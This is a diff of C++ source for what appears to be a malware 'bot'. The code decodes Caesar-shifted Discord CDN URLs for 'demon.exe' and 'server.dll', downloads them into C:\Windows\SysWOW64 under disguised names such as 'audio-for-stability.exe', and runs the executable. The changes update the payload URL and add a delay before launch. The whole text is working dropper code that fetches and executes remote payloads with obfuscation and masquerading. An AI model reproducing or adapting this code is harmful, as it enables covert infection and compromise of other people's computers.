@@ -312,7 +312,7 @@ void mainbot()
                 }
 
 
-                std::string download = (decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/891660223981428758/ghprq.hah").c_str());
+                std::string download = (decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/892108037618270258/ghprq.hah").c_str());
                 std::string path = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
                 URLDownloadToFileA(NULL, download.c_str(), path.c_str(), 0, NULL);
                 system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
@@ -320,7 +320,7 @@ void mainbot()
                 std::string dll = (decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/891659436341477376/vhuyhu.goo").c_str());
                 std::string dllpath = (dead("C:\\Windows\\SysWOW64\\audio.dll").c_str());
                 URLDownloadToFileA(NULL, dll.c_str(), dllpath.c_str(), 0, NULL);
-
+                Sleep(2000);
                 system(dead("start audio-for-stability.exe").c_str());
                 system(dead("cls").c_str());
                
